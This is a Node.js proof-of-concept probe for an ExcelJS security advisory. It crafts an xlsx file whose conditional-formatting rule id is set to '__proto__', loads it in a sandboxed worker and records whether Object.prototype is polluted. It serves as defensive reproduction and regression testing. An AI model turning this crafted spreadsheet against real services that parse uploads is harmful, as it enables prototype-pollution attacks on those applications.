// Small in-memory regression probe for the published advisory, confined to a
// disposable worker. No real account data, filesystem extraction or OOM input.
const { Worker } = require('worker_threads');
const ExcelJS = require('exceljs');
const JSZip = require('jszip');
const fs = require('fs');
const path = require('path');
(async () => {
  const before = Object.keys(Object.prototype);
  const workbook = new ExcelJS.Workbook();
  const sheet = workbook.addWorksheet('Probe');
  sheet.addRows([[1], [2]]);
  sheet.addConditionalFormatting({ ref: 'A1:A2', rules: [{ type: 'dataBar', cfvo: [{ type: 'min' }, { type: 'max' }], color: { argb: 'FF00FF00' } }] });
  const zip = await JSZip.loadAsync(await workbook.xlsx.writeBuffer());
  const name = 'xl/worksheets/sheet1.xml';
  const original = await zip.file(name).async('string');
  const changed = original.replace(/(<x14:cfRule\b[^>]*\bid=")[^"]+("[^>]*>)/, '$1__proto__$2');
  if (changed === original) throw new Error('Probe did not generate the expected conditional-format extension');
  zip.file(name, changed);
  const bytes = await zip.generateAsync({ type: 'nodebuffer' });
  const result = await new Promise((resolve, reject) => {
    const worker = new Worker(`
      const { parentPort, workerData } = require('worker_threads');
      const ExcelJS = require('exceljs');
      new ExcelJS.Workbook().xlsx.load(Buffer.from(workerData)).then(() => {
        parentPort.postMessage({ loaded: true, pollutedKeys: Object.keys(Object.prototype) });
      }).catch(error => parentPort.postMessage({ loaded: false, errorType: error.name, pollutedKeys: Object.keys(Object.prototype) }));
    `, { eval: true, workerData: bytes, resourceLimits: { maxOldGenerationSizeMb: 128 } });
    const timer = setTimeout(() => { worker.terminate(); reject(new Error('Probe timeout')); }, 5000);
    worker.once('message', async value => { clearTimeout(timer); await worker.terminate(); resolve(value); });
    worker.once('error', error => { clearTimeout(timer); reject(error); });
  });
  const evidence = {
    advisory: 'https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-86ch-m4gp-r5xf',
    exceljs: require('exceljs/package.json').version,
    workerResult: result,
    parentPrototypeUnchanged: JSON.stringify(before) === JSON.stringify(Object.keys(Object.prototype)),
    scope: 'Direct xlsx.load reproduction inside disposable worker; application-specific preflight and UI not exercised by this probe.'
  };
  fs.writeFileSync(path.join(__dirname, 'exceljs-x14-probe.json'), JSON.stringify(evidence, null, 2));
  console.log(JSON.stringify(evidence));
})().catch(error => { console.error(error.message); process.exitCode = 1; });
